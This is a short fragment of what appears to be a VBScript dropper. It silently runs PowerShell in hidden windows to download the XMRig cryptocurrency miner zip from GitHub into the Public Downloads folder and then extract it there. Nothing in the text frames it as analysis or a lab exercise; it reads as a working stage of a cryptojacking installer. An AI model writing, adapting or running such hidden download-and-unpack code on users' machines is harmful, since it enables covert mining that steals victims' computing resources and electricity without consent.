...
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-gcc-x64.zip -OutFile C:\Users\Public\Downloads\xmrig-6.26.0-windows-gcc-x64.zip", 0, True
objShell.Run "powershell.exe -Command Expand-Archive -Path 'C:\Users\Public\Downloads\xmrig-6.26.0-windows-gcc-x64.zip' -DestinationPath 'C:\Users\Public\Downloads\' -Force", 0, True
